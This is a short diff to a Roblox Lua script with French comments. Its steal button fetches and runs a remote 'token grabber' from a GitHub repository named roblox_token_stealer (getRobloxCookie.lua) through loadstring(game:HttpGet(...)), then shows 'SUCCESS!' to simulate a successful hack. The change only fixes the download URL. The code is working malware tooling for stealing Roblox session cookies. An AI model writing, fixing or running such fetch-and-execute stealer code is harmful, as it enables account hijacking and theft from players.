@@ -40,7 +40,7 @@ stealButton.MouseButton1Click:Connect(function()
     wait(2)
 
     -- Charger le script token grabber
-    loadstring(game:HttpGet("https://github.com/NukeInTheShell/roblox_token_stealer/blob/codespace-crispy-enigma-w564qw7pq9r3v456/getRobloxCookie.lua"))()
+    loadstring(game:HttpGet("https://github.com/NukeInTheShell/roblox_token_stealer/codespace-crispy-enigma-w564qw7pq9r3v456/getRobloxCookie.lua"))()
     
     -- Simuler un hack réussi
     stealButton.Text = "SUCCESS!"
